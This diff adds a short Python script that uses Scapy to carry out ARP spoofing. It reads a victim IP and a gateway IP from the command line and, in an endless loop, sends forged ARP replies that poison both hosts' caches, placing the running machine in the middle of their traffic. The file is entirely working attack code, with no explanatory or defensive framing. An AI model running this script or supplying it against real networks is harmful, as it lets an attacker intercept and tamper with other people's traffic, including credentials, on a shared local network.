@@ -1,0 +1,21 @@
+from scapy.all import *
+import time
+import sys
+
+victim_ip = sys.argv[1]
+gateway_ip = sys.argv[2]
+
+victim_mac = getmacbyip(victim_ip)
+gateway_mac = getmacbyip(gateway_ip)
+
+while True:
+    
+    pkt1 = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip)
+    send(pkt1, verbose=0)
+
+    
+    pkt2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip)
+    send(pkt2, verbose=0)
+
+    time.sleep(1)
+
